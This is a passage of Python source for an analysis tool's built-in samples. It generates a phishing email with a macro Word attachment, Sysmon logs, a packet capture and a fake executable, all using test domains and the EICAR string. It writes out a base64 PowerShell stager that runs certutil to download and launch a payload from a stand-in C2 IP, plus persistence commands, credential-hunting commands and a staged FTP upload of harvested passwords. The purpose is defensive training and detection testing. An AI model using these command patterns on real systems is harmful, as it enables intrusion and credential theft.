"""Sample files built into SO-CRATES, for the Welcome screen's sample
buttons that work with no internet access (POST /api/load-sample).

Each sample is generated on request, not shipped as a file. The email's
attachment, the pcap's payload and the binary sample carry the EICAR
antivirus test string, and building them here - with the string split in
this source - means no file in the container image contains the
signature for a scanner to flag or quarantine. It only exists in full in
an analysis directory once someone loads a sample.

All four use only reserved .example domains, documentation-range public
IPs (RFC 2606, RFC 5737) and private ones for the victim's network
(RFC 1918), and tell one story (docs/usage/analyzing-files.md):
a phishing email delivers a macro document (email); opening it on
Jordan's workstation starts PowerShell, which downloads a payload that
persists and harvests saved credentials (log); the download and the
credentials' FTP upload are on the wire (pcap); and the payload itself
is the binary sample.

Samples are byte-for-byte deterministic, so loading one twice reopens the
same analysis (same MD5) instead of creating another.
"""

import base64
import io
import json
import random
import socket
import struct
import zipfile
from email.message import EmailMessage
from email.policy import SMTP

# The EICAR test string - a harmless file antivirus and YARA rulesets flag
# by design - in two halves, so this file itself never matches.
EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'


# What the macro runs: PowerShell decoding and running a base64 stager -
# certutil fetching the payload from the email's originating IP, then
# starting it. Plain ASCII base64 (decoded with FromBase64String), not
# -EncodedCommand's UTF-16, so CyberChef's Magic decodes it in one step.
_VICTIM, _C2 = '10.20.4.12', '203.0.113.66'
_DROPPED = 'C:\\Users\\Public\\update.exe'
_DOWNLOAD = f'-urlcache -split -f http://{_C2}/update.bin {_DROPPED}'
_STAGER = f'certutil {_DOWNLOAD}; Start-Process {_DROPPED}'
_STAGER_COMMAND = ('powershell.exe -nop -w hidden -c "IEX([Text.Encoding]::ASCII.GetString('
                   "[Convert]::FromBase64String('%s')))\"" % base64.b64encode(_STAGER.encode()).decode())
# The phishing link carries the recipient's address, base64-encoded, so the
# sender knows who clicked - CyberChef decodes it.
_RECIPIENT = 'jordan.lee@corp.example'
_PHISH_URL = ('https://northbridgepay.example.account-verify.example/session?u='
              + base64.b64encode(_RECIPIENT.encode()).decode())


def _macro_document():
    """A minimal macro-enabled Word document (.docm): an Office Open XML
    zip whose vbaProject.bin holds an AutoOpen macro - in place of the
    real compiled VBA, the macro's source and the EICAR string, stored
    uncompressed so YARA sees them. Fixed timestamps keep it
    deterministic."""
    parts = {
        '[Content_Types].xml': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '</Types>').encode(),
        '_rels/.rels': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            'relationships/officeDocument" Target="word/document.xml"/></Relationships>').encode(),
        'word/document.xml': (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>Payroll Adjustment Form - enable editing and content to view.'
            '</w:t></w:r></w:p></w:body></w:document>').encode(),
        'word/vbaProject.bin': (
            b'Attribute VB_Name = "ThisDocument"\r\n'
            b'Sub AutoOpen()\r\n'
            b'    Shell "' + _STAGER_COMMAND.replace('"', '""').encode() + b'", vbHide\r\n'
            b'End Sub\r\n' + EICAR),
    }
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        for name, data in parts.items():
            info = zipfile.ZipInfo(name, date_time=(2026, 2, 2, 17, 5, 0))
            info.compress_type = zipfile.ZIP_STORED
            zf.writestr(info, data)
    return buf.getvalue()


def _fix_boundaries(msg, prefix):
    """Give every multipart part a fixed boundary - left unset, the email
    package picks a random one each time the message is generated."""
    for i, part in enumerate(msg.walk()):
        if part.is_multipart():
            part.set_boundary(f'=={prefix}-{i}==')


def build_email_sample():
    """A phishing message that exercises every part of email analysis: a
    spoofed sender with a Reply-To and Return-Path elsewhere, failing SPF
    and DMARC, a link whose text names a different domain than it goes
    to, a macro-enabled Word attachment (carrying the EICAR string, so
    YARA flags it) and a forwarded message. Only reserved .example domains and documentation-range IPs
    (RFC 2606, RFC 5737), so nothing in it points at a real organization."""
    earlier = EmailMessage()
    earlier['Date'] = 'Mon, 02 Feb 2026 16:12:09 +0000'
    earlier['From'] = '"Northbridge Payroll" <noreply@northbridgepay.example>'
    earlier['To'] = 'jordan.lee@corp.example'
    earlier['Subject'] = 'Payroll schedule update'
    earlier['Message-ID'] = '<sched-0202@northbridgepay.example>'
    earlier.set_content(
        'Hello,\n\n'
        'Starting next month, payroll adjustments must be confirmed in the\n'
        'employee portal: https://portal.northbridgepay.example/schedule\n\n'
        'Northbridge Payroll\n')

    msg = EmailMessage()
    msg['Received'] = ('from mx1.corp.example (mx1.corp.example [10.20.0.5]) '
                       'by mail.corp.example with ESMTPS; Tue, 03 Feb 2026 08:41:17 +0000')
    msg['Received'] = ('from smtp.northbridge-secure.example (smtp.northbridge-secure.example [203.0.113.66]) '
                       'by mx1.corp.example with ESMTP; Tue, 03 Feb 2026 08:41:15 +0000')
    msg['Authentication-Results'] = ('mx1.corp.example; spf=fail smtp.mailfrom=northbridgepay.example; '
                                     'dkim=none; dmarc=fail header.from=northbridgepay.example')
    msg['Return-Path'] = '<bounce-7731@mailer.northbridge-secure.example>'
    msg['Date'] = 'Tue, 03 Feb 2026 08:41:12 +0000'
    msg['From'] = '"Northbridge Payroll" <payroll@northbridgepay.example>'
    msg['Reply-To'] = 'payroll-support@northbridge-secure.example'
    msg['To'] = '"Jordan Lee" <jordan.lee@corp.example>'
    msg['Subject'] = 'ACTION REQUIRED: Confirm your direct deposit by end of day'
    msg['Message-ID'] = '<20260203084112.7731@mailer.northbridge-secure.example>'
    msg['X-Mailer'] = 'PHPMailer 6.1.4'

    msg.set_content(
        'Dear Jordan,\n\n'
        'Your February direct deposit is on hold. To avoid a delay in your pay,\n'
        'confirm your bank details today at https://portal.northbridgepay.example/login\n\n'
        'You can also complete the attached Payroll Adjustment form.\n'
        "We've attached our earlier notice for reference.\n\n"
        'Northbridge Payroll Services\n')
    msg.add_alternative(
        '<html><body style="font-family: Arial, sans-serif;">'
        '<p>Dear Jordan,</p>'
        '<p>Your February direct deposit is <b>on hold</b>. To avoid a delay in your pay, '
        'confirm your bank details today:</p>'
        f'<p><a href="{_PHISH_URL}">'
        'https://portal.northbridgepay.example/login</a></p>'
        '<p>You can also complete the attached Payroll Adjustment form. '
        "We've attached our earlier notice for reference.</p>"
        '<p>Questions? Visit our <a href="https://help.northbridgepay.example/payroll">Help Center</a>.</p>'
        '<p>Northbridge Payroll Services</p>'
        '</body></html>', subtype='html')
    msg.add_attachment(_macro_document(), maintype='application',
                       subtype='vnd.ms-word.document.macroEnabled.12',
                       filename='Payroll_Adjustment_Form.docm')
    msg.add_attachment(earlier)
    _fix_boundaries(msg, 'SO-CRATES-sample')
    return msg.as_bytes(policy=SMTP)


def build_binary_sample():
    """The payload the log and pcap samples download as update.exe: a fake
    executable (it doesn't run) carrying the EICAR string - byte-for-byte
    what Suricata extracts from the pcap sample, so the hashes match
    across the two analyses."""
    return _fake_pe(EICAR)


_SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': 'Microsoft-Windows-Sysmon',
           'Computer': 'FIN-WS-0412.corp.example'}
_WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
_POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
_CMD = 'C:\\Windows\\System32\\cmd.exe'


def _process(time, pid, image, command_line, parent_pid, parent_image, parent_command_line,
             user='CORP\\jordan.lee'):
    """A Sysmon process-creation event (ID 1)."""
    return dict(_SYSMON, EventID=1, SystemTime=time, ProcessId=pid, Image=image,
                OriginalFileName=image.rsplit('\\', 1)[-1].upper(), CommandLine=command_line,
                ParentProcessId=parent_pid, ParentImage=parent_image,
                ParentCommandLine=parent_command_line, User=user, IntegrityLevel='Medium')


def build_log_sample():
    """Sysmon events, one JSON object per line, from the workstation that
    opened the sample email's payroll form: Word starts PowerShell running
    a base64-encoded stager (_STAGER_COMMAND), certutil downloads the
    payload from the email's originating IP, and the payload enumerates
    the user, persists (scheduled task and Run key), hunts for saved
    credentials and connects out to upload them by FTP - the connection
    the pcap sample shows. Built to fire long-standing SigmaHQ rules with
    the built-in ruleset."""
    events = [
        _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
                 '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
                 3312, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE'),
        _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
                 _STAGER_COMMAND, 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
        _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
                 f'certutil.exe {_DOWNLOAD}',
                 7044, _POWERSHELL, _STAGER_COMMAND),
        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
             Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
             Initiated='true', SourceIp=_VICTIM, SourcePort=51733,
             DestinationIp=_C2, DestinationPort=80),
        _process('2026-02-03T08:45:02.690Z', 7390, 'C:\\Windows\\System32\\whoami.exe', 'whoami /all',
                 7372, _CMD, 'cmd.exe /c whoami /all'),
        _process('2026-02-03T08:45:20.233Z', 7466, 'C:\\Windows\\System32\\schtasks.exe',
                 f'schtasks /create /sc onlogon /tn "Payroll Updater" /tr {_DROPPED} /f',
                 7450, _CMD, 'cmd.exe /c schtasks /create /sc onlogon /tn "Payroll Updater"'),
        dict(_SYSMON, EventID=13, SystemTime='2026-02-03T08:45:25.871Z', EventType='SetValue',
             ProcessId=7302, Image=_DROPPED, User='CORP\\jordan.lee',
             TargetObject='HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft'
                          '\\Windows\\CurrentVersion\\Run\\PayrollUpdater',
             Details=_DROPPED),
        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\cmdkey.exe', 'cmdkey /list',
                 7570, _CMD, 'cmd.exe /c cmdkey /list'),
        _process('2026-02-03T08:45:52.317Z', 7612, 'C:\\Windows\\System32\\findstr.exe',
                 'findstr /si password *.xml *.ini *.txt *.config', 7598, _CMD,
                 'cmd.exe /c cd C:\\Users\\jordan.lee && findstr /si password *.xml *.ini *.txt *.config'),
        # The upload the pcap sample shows - harvested credentials, by FTP.
        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:46:10.204Z', ProcessId=7302,
             Image=_DROPPED, User='CORP\\jordan.lee', Protocol='tcp', Initiated='true',
             SourceIp=_VICTIM, SourcePort=51790, DestinationIp=_C2, DestinationPort=21),
    ]
    return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()


_VICTIM_MAC, _GATEWAY_MAC = bytes.fromhex('0050569a4c12'), bytes.fromhex('00163e1d2b01')
_MSS = 1448

# The workstation's own name and the LAN names it looks for - the chatter
# below is normal Windows background noise, none of it parsed by Suricata,
# so it's what the tshark metadata view surfaces that Suricata's won't.
_WORKSTATION_NB = 'FIN-WS-0412'
_LLMNR_MCAST, _SSDP_MCAST = '224.0.0.252', '239.255.255.250'
_SUBNET_BCAST = '10.20.4.255'  # the /24 the victim (10.20.4.12) sits on
_RESOLVER = '10.20.4.1'        # the workstation's internal DNS resolver

# The dropped payload's domain-generation-algorithm beacon: a dozen
# algorithmically-generated names it tries in turn to find its live C2.
# High character-spread, no vowels and long enough to read as encoded, so
# the DNS Heuristics tab flags each as a possible DGA; under the reserved
# .example TLD (RFC 2606) so the sample points at no real domain. Generated
# once (random.Random(20260203)) and pinned here so the sample never drifts.
_DGA_DOMAINS = (
    'l6rm390zn5x8f1.example', 'z825rb3pcdnrg6.example', 'mcxfpk58jw6q2w.example',
    'z09ctjfdj1swrg.example', '2g6xqk97frxhnb.example', 'g7nw51437089ht.example',
    'shxv0mcn46d383.example', 'd3vfnj0mz6rh8p.example', 'h4c9rvt0qff6nd.example',
    'h9lvz48bnntr0s.example', 'nvjz7161slpcqb.example', 'wvnzfpcdh38jkc.example',
)


def _dns_name(name):
    return b''.join(bytes([len(p)]) + p.encode() for p in name.split('.')) + b'\0'


def _dns_message(txid, qname, qtype=1, answer=None, rcode=0):
    """A DNS message: one question, type A by default. A response (an answer
    given, or a non-zero rcode such as 3 for NXDOMAIN) sets the response flags
    and appends the A record. LLMNR shares this format - tshark decodes it as
    LLMNR by its port (5355); DNS proper is Suricata's."""
    is_response = answer is not None or rcode
    flags = 0x0100 | (0x8180 if is_response else 0) | rcode  # 0x0100: recursion desired
    msg = struct.pack('!HHHHHH', txid, flags, 1, 1 if answer else 0, 0, 0)
    msg += _dns_name(qname) + struct.pack('!HH', qtype, 1)
    if answer:  # a single A record, name compressed to the question (0xc00c)
        msg += b'\xc0\x0c' + struct.pack('!HHIH', 1, 1, 300, 4) + socket.inet_aton(answer)
    return msg


def _ext(ext_type, data):
    return struct.pack('!HH', ext_type, len(data)) + data


def _tls_record(content_type, body, version=b'\x03\x03'):
    return bytes([content_type]) + version + struct.pack('!H', len(body)) + body


def _tls_handshake(msg_type, body):
    return bytes([msg_type]) + struct.pack('!I', len(body))[1:] + body


def _certificate_message(cert_der):
    """A TLS Certificate handshake body carrying one certificate (each length
    a 24-bit field): the list length, then the cert's length and its DER."""
    one = struct.pack('!I', len(cert_der))[1:] + cert_der
    return struct.pack('!I', len(one))[1:] + one


# A TLS 1.2 ClientHello and ServerHello for the C2 check-in. 1.2, not 1.3, so
# the server's certificate crosses the wire readable and Suricata can log its
# subject and issuer. The SNI matches the certificate's name, so only the
# self-signed Finding fires (not a name mismatch).
_C2_SNI = b'update-check.example'
_CLIENT_HELLO_BODY = (
    b'\x03\x03' + bytes(range(32)) + b'\x00'                          # version, random, no session id
    + struct.pack('!H', 2) + struct.pack('!H', 0xc02f) + b'\x01\x00'  # one cipher (ECDHE-RSA-AES128-GCM), null compression
    + struct.pack('!H', len(_ext(0x0000, struct.pack('!HBH', len(_C2_SNI) + 3, 0, len(_C2_SNI)) + _C2_SNI)))
    + _ext(0x0000, struct.pack('!HBH', len(_C2_SNI) + 3, 0, len(_C2_SNI)) + _C2_SNI))  # server_name (SNI)
_SERVER_HELLO_BODY = (
    b'\x03\x03' + bytes(range(100, 132)) + b'\x00'                    # version, random, no session id
    + struct.pack('!H', 0xc02f) + b'\x00' + struct.pack('!H', 0))     # chosen cipher, null compression, no extensions

# The C2's self-signed certificate (issuer == subject == CN=update-check.example),
# valid 2026-01-01 to 2027-01-01 so it covers the capture's date and only the
# self-signed Finding fires. A real, well-formed X.509 so Suricata parses it,
# generated once with pyca/cryptography and pinned here as DER (the app has no
# crypto dependency at runtime, and the sample must stay byte-for-byte stable).
_C2_TLS_CERT = bytes.fromhex(
    '308202e0308201c8a00302010202054147454e54300d06092a864886f70d01010b0500301f311d301b06035504030c147570646174652d636865636b'
    '2e6578616d706c65301e170d3236303130313030303030305a170d3237303130313030303030305a301f311d301b06035504030c147570646174652d'
    '636865636b2e6578616d706c6530820122300d06092a864886f70d01010105000382010f003082010a0282010100a5ee0e4ebdf3616ad114d9b1f3dd'
    'e00d669f82a3d1ac038664b7ee55a40bdcabf320634031f9c5cbde00a92a62c01cf0bc3d12f800bd65e5355adc4a9cb7ac5af5f125ebe8767865d333'
    'c393391ad90003ee8e5484aa764666d70e40c662a15ff875fcb3541949d73d4ac4c143824958839c42b2ca44473e983d3d21946e1308e25d44316279'
    '1d97aa33c6ef0d47255b561002800492f2b634865cb46cabaf1887f273670cdb782effd4d71f78a43a5e03a771d32ea7ad07e366ff2abfb5f731d3f5'
    'c0e80363356dd2333c3872f5b7d4fede6556b5b8d51aef39ad2da9c223b58ffedd747185716a698340f4a989f82236c80a05f07b545886f41d927a06'
    '460d0203010001a3233021301f0603551d110418301682147570646174652d636865636b2e6578616d706c65300d06092a864886f70d01010b050003'
    '820101001b5e299aa4fd254319b9f3815f87457129cdb9149eb6f293d69c28a0c294b2040a9cc3747b2748550a8140e05ab02e52bf527c25c0dba2fa'
    'bc9c22897f32a25ea39560f0f332b928e9cc0fbceb4ff412006fbaf6953fca6babb38c9266f8bff0f21ae320d0b45d80b9c3b53084731ac9c47f5616'
    '2116a32fc5d107595e45d1243743596c9de73dbe0c6b7cc8989fbd069ff589132fd32cd1ff07245eadae51f95ed04e76e41e5fae92dfb7eb103e9320'
    '29f9287a8f1a4590093d0bdb0c6979cba9d9e075c0d0a65086d1220845a3b40e68f81fe2fbda382c7b04c3c16ce9340e87f513ed1dbd9958bc57af48'
    '681546fe96826adddeaa71b3e23a010a6e128a7c')


def _nbns_name(name, suffix):
    """A NetBIOS name: the 15-char name plus a one-byte suffix, each nibble
    half-ASCII-encoded the way NBNS carries it on the wire."""
    raw = name.upper().ljust(15)[:15].encode() + bytes([suffix])
    encoded = b''.join(bytes([0x41 + (c >> 4), 0x41 + (c & 0xf)]) for c in raw)
    return b'\x20' + encoded + b'\x00'


def _nbns(txid, flags, name, suffix, additional_addr=None, ttl=300000):
    """A NetBIOS name-service message - a query or a name registration. A
    registration carries the registering host's own address as an additional
    record. Suricata doesn't parse NBNS; tshark decodes it by its port (137)."""
    ar = (b'\xc0\x0c' + struct.pack('!HHIH', 0x20, 1, ttl, 6) + b'\x00\x00'
          + socket.inet_aton(additional_addr)) if additional_addr else b''
    head = struct.pack('!HHHHHH', txid, flags, 1, 0, 0, 1 if ar else 0)
    return head + _nbns_name(name, suffix) + struct.pack('!HH', 0x20, 1) + ar


def _checksum(data):
    if len(data) % 2:
        data += b'\0'
    total = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return ~total & 0xffff


class _Capture:
    """Just enough of a pcap writer for the sample: Ethernet/IPv4/TCP
    between the workstation and one remote host, seeded so the bytes are
    the same every time."""

    def __init__(self, start):
        self.packets = []
        self.t = start
        self.rng = random.Random(4412)

    def _tcp(self, src, dst, sport, dport, seq, ack, flags, payload=b'', dt=0.0005):
        hdr = struct.pack('!HHIIBBHHH', sport, dport, seq, ack, 5 << 4, flags, 64240, 0, 0)
        pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack('!BBH', 0, 6, len(hdr) + len(payload))
        hdr = hdr[:16] + struct.pack('!H', _checksum(pseudo + hdr + payload)) + hdr[18:]
        ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(hdr) + len(payload), self.rng.randint(1, 65535),
                         0x4000, 128 if src == _VICTIM else 52, 6, 0, socket.inet_aton(src), socket.inet_aton(dst))
        ip = ip[:10] + struct.pack('!H', _checksum(ip)) + ip[12:]
        smac, dmac = (_VICTIM_MAC, _GATEWAY_MAC) if src == _VICTIM else (_GATEWAY_MAC, _VICTIM_MAC)
        self.t += dt
        self.packets.append((self.t, dmac + smac + b'\x08\x00' + ip + hdr + payload))

    def _udp(self, src, dst, sport, dport, payload, ttl=64, dt=0.01):
        """A UDP datagram. The destination MAC follows from the address: the
        all-ones broadcast, the IPv4 multicast mapping (01:00:5e + the low 23
        bits), or - for a unicast flow - the gateway/victim by direction."""
        s, d = socket.inet_aton(src), socket.inet_aton(dst)
        udp = struct.pack('!HHHH', sport, dport, 8 + len(payload), 0) + payload
        pseudo = s + d + struct.pack('!BBH', 0, 17, len(udp))
        udp = udp[:6] + struct.pack('!H', _checksum(pseudo + udp) or 0xffff) + udp[8:]
        ip = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 20 + len(udp), self.rng.randint(1, 65535),
                         0, ttl, 17, 0, s, d)
        ip = ip[:10] + struct.pack('!H', _checksum(ip)) + ip[12:]
        if dst == '255.255.255.255' or dst.endswith('.255'):
            smac, dmac = _VICTIM_MAC, b'\xff' * 6
        elif 224 <= d[0] <= 239:  # IPv4 multicast
            smac, dmac = _VICTIM_MAC, b'\x01\x00\x5e' + bytes([d[1] & 0x7f, d[2], d[3]])
        else:
            smac, dmac = (_VICTIM_MAC, _GATEWAY_MAC) if src == _VICTIM else (_GATEWAY_MAC, _VICTIM_MAC)
        self.t += dt
        self.packets.append((self.t, dmac + smac + b'\x08\x00' + ip + udp))

    def chatter(self):
        """The workstation's normal Windows name-resolution and discovery
        broadcasts/multicasts before the attack traffic - LLMNR and NBNS
        name lookups and an SSDP device search, none parsed by Suricata."""
        # NBNS: the workstation registering its own name (retransmitted, as
        # Windows does), then an unanswered query for a file server.
        reg = _nbns(0x8a01, 0x2910, _WORKSTATION_NB, 0x20, additional_addr=_VICTIM)
        for _ in range(3):
            self._udp(_VICTIM, _SUBNET_BCAST, 137, 137, reg, ttl=128, dt=0.3)
        self._udp(_VICTIM, _SUBNET_BCAST, 137, 137, _nbns(0x8a02, 0x0110, 'FILE-SRV-01', 0x20), ttl=128, dt=0.3)
        # LLMNR: the proxy-autoconfig lookup and the same file server by name.
        self._udp(_VICTIM, _LLMNR_MCAST, 54120, 5355, _dns_message(0x4a01, 'wpad'), ttl=1, dt=0.3)
        self._udp(_VICTIM, _LLMNR_MCAST, 54121, 5355, _dns_message(0x4a02, 'file-srv-01'), ttl=1, dt=0.3)
        # SSDP: an M-SEARCH discovering UPnP devices on the LAN.
        self._udp(_VICTIM, _SSDP_MCAST, 54130, 1900,
                  b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\n'
                  b'ST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n', ttl=1, dt=0.3)

    def beacon(self):
        """After the payload is dropped, its post-exploitation beacon: a DGA
        burst (a dozen algorithmically-generated domains, most NXDOMAIN, one
        resolving to the C2) that lights up the DNS Heuristics tab, a C2
        check-in over TLS whose self-signed certificate Suricata flags as a
        Finding, and an IRC C2 join - a protocol tshark identifies but neither
        Suricata nor shark_protocols parses, so it becomes a connection row
        (conn_irc) in the Connections section. All attacker traffic, run from
        the workstation."""
        # DGA domain-generation beacon, one query each over one stub->resolver
        # flow (as a Windows stub resolver reuses its source port for a burst).
        for i, domain in enumerate(_DGA_DOMAINS):
            txid = 0x6000 + i
            self._udp(_VICTIM, _RESOLVER, 51812, 53, _dns_message(txid, domain), ttl=128, dt=0.2)
            # all fail but the last, which points the payload at its live C2
            answer = _C2 if domain is _DGA_DOMAINS[-1] else None
            rcode = 0 if answer else 3  # NXDOMAIN
            self._udp(_RESOLVER, _VICTIM, 53, 51812, _dns_message(txid, domain, answer=answer, rcode=rcode),
                      ttl=64, dt=0.03)
        # TLS C2 check-in whose self-signed certificate is the Finding.
        client_hello = _tls_record(22, _tls_handshake(1, _CLIENT_HELLO_BODY), version=b'\x03\x01')
        server_flight = _tls_record(22, _tls_handshake(2, _SERVER_HELLO_BODY)
                                    + _tls_handshake(11, _certificate_message(_C2_TLS_CERT))
                                    + _tls_handshake(14, b''))  # ServerHelloDone
        self.session(51801, 443, [(True, client_hello), (False, server_flight)], gap=2.0)
        # IRC C2: the bot registers and joins its channel, where the operator's
        # topic carries a command. tshark decodes IRC; neither Suricata nor
        # shark_protocols parses it, so it lands as a conn_irc connection row.
        self.session(51802, 6667, [
            (False, b':irc.c2.example NOTICE AUTH :*** Looking up your hostname\r\n'),
            (True, b'NICK win-' + _WORKSTATION_NB.encode() + b'\r\n'),
            (True, b'USER bot 0 * :' + _WORKSTATION_NB.encode() + b'\r\n'),
            (False, b':irc.c2.example 001 win-' + _WORKSTATION_NB.encode() + b' :Welcome\r\n'),
            (True, b'JOIN #ops\r\n'),
            (False, b':irc.c2.example 332 win-' + _WORKSTATION_NB.encode() + b' #ops :!exfil ftp://203.0.113.66\r\n'),
        ], gap=1.5)

    def session(self, cport, sport, steps, gap):
        """A TCP connection from the workstation: handshake, each
        (from_client, payload) step in order in MSS-sized segments, FIN. A
        step can instead be a callable, run at that point - for another
        connection that happens in the middle of this one."""
        v, c = _VICTIM, _C2
        cs, ss = self.rng.randint(10**8, 4 * 10**9), self.rng.randint(10**8, 4 * 10**9)
        self._tcp(v, c, cport, sport, cs, 0, 0x02, dt=gap); cs += 1
        self._tcp(c, v, sport, cport, ss, cs, 0x12, dt=0.041); ss += 1
        self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0004)
        for step in steps:
            if callable(step):
                step()
                continue
            from_client, payload = step
            for i in range(0, len(payload), _MSS):
                seg = payload[i:i + _MSS]
                if from_client:
                    self._tcp(v, c, cport, sport, cs, ss, 0x18, seg, dt=0.05); cs += len(seg)
                    self._tcp(c, v, sport, cport, ss, cs, 0x10, dt=0.04)
                else:
                    self._tcp(c, v, sport, cport, ss, cs, 0x18, seg, dt=0.04); ss += len(seg)
                    self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0005)
        self._tcp(v, c, cport, sport, cs, ss, 0x11, dt=0.01); cs += 1
        self._tcp(c, v, sport, cport, ss, cs, 0x11, dt=0.04); ss += 1
        self._tcp(v, c, cport, sport, cs, ss, 0x10, dt=0.0004)

    def to_bytes(self):
        out = [struct.pack('<IHHiIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)]
        for ts, frame in self.packets:
            sec = int(ts)
            out.append(struct.pack('<IIII', sec, int(round((ts - sec) * 1e6)), len(frame), len(frame)) + frame)
        return b''.join(out)


def _fake_pe(body):
    """A minimal Windows executable header (MZ, DOS stub, PE signature) with
    body after it - enough for Suricata's executable-download rules and
    for `file` to call it a PE. It doesn't run."""
    dos = bytearray(b'MZ\x90\x00' + b'\x00' * 56)
    dos[0x3c:0x40] = (0x80).to_bytes(4, 'little')
    stub = b'\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21This program cannot be run in DOS mode.\r\r\n$'
    return (bytes(dos) + stub).ljust(0x80, b'\x00') + b'PE\x00\x00\x4c\x01\x03\x00' + b'\x00' * 200 + body + b'\x00' * 300


def build_pcap_sample():
    """The sample workstation's traffic after the log sample's events:
    certutil (Microsoft-CryptoAPI user agent) downloads update.bin - a fake
    executable carrying the EICAR string - from the email's originating
    IP, then the payload uploads the credentials it harvested over FTP,
    named the way AgentTesla names them (PW_<user>-<host>_<timestamp>.html).
    Fires ET Open's AgentTesla FTP exfiltration rule and its executable-
    download rules (5 alerts with the built-in ruleset when written), and
    Suricata's extracted copy of the payload gets YARA hits.
    It opens with the workstation's normal Windows LAN chatter (LLMNR, NBNS
    and SSDP) - none of it parsed by Suricata, so it populates the tshark
    metadata view with protocols Suricata's own analysis leaves out. After
    the download, the payload beacons: a DGA burst of a dozen generated
    domains (DNS Heuristics flags them), a TLS C2 check-in whose self-signed
    certificate is a Finding, and an IRC C2 join that becomes a connection
    row (conn_irc) since tshark names it but nothing parses it."""
    cap = _Capture(start=1770108270.0)  # 2026-02-03T08:44:30Z, matching the log sample
    payload = build_binary_sample()
    cap.chatter()  # the workstation's normal Windows LAN chatter (tshark decodes it, Suricata doesn't)
    cap.session(51733, 80, [
        (True, b'GET /update.bin HTTP/1.1\r\nCache-Control: no-cache\r\nConnection: Keep-Alive\r\n'
               b'Pragma: no-cache\r\nAccept: */*\r\nUser-Agent: Microsoft-CryptoAPI/10.0\r\n'
               b'Host: 203.0.113.66\r\n\r\n'),
        (False, b'HTTP/1.1 200 OK\r\nServer: nginx\r\nContent-Type: application/octet-stream\r\n'
                b'Content-Length: %d\r\nConnection: close\r\n\r\n' % len(payload) + payload),
    ], gap=1.0)
    cap.beacon()  # the dropped payload's DGA lookups (DNS Heuristics) and self-signed TLS C2 (a Finding)
    report = (b'<html><head><title>PW_jordan.lee-FIN-WS-0412</title></head><body>'
              b'<h2>Recovered credentials - FIN-WS-0412 / jordan.lee</h2><table>'
              b'<tr><th>URL</th><th>User</th><th>Password</th></tr>'
              b'<tr><td>https://portal.northbridgepay.example/login</td><td>jordan.lee</td><td>Summer2026!</td></tr>'
              b'<tr><td>https://mail.corp.example</td><td>jordan.lee@corp.example</td><td>Summer2026!</td></tr>'
              b'</table></body></html>')
    filename = b'PW_jordan.lee-FIN-WS-0412_2026_02_03_08_46_10.html'
    cap.session(51790, 21, [
        (False, b'220 FTP Server ready.\r\n'), (True, b'USER exfil@northbridge-secure.example\r\n'),
        (False, b'331 Password required\r\n'), (True, b'PASS h4rv3st3d\r\n'), (False, b'230 Logged in.\r\n'),
        (True, b'TYPE I\r\n'), (False, b'200 Type set to I\r\n'),
        (True, b'PASV\r\n'), (False, b'227 Entering Passive Mode (203,0,113,66,195,80)\r\n'),
        (True, b'STOR ' + filename + b'\r\n'), (False, b'150 Accepted data connection\r\n'),
        # The upload itself, over the PASV data connection the 227 reply
        # announced (195*256+80 = 50000), before the server confirms it.
        lambda: cap.session(51791, 50000, [(True, report)], gap=0.01),
        (False, b'226 File successfully transferred\r\n'), (True, b'QUIT\r\n'), (False, b'221 Goodbye.\r\n'),
    ], gap=99.0)
    return cap.to_bytes()


# name -> (filename the analysis is given, builder). The only names
# POST /api/load-sample accepts.
SAMPLES = {
    'pcap': ('sample-workstation-traffic.pcap', build_pcap_sample),
    'binary': ('sample-update.exe', build_binary_sample),
    'log': ('sample-sysmon-log.json', build_log_sample),
